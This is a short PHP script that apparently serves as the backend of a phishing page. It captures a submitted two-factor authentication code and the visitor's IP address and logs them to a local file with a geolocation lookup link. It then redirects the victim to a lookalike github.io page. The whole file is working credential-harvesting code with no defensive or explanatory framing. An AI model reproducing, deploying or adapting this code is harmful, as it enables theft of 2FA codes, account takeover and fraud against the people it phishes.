

<?php
$file = "LINGACORRRR";
$a2f = $_POST['a2f'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a'); 
fwrite($handle, "\n");
fwrite($handle, "CODE A2F        : ");
fwrite($handle, "$a2f");
fwrite($handle, "\n");
fwrite($handle, "https://www.geodatatool.com/en/?ip=$ip");
fwrite($handle, "\n");
fwrite($handle, "=============================================");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://adsmangers.github.io/bussines/jonsbo/feloz.html?container-navigation\";
// -->
</script>";
?>

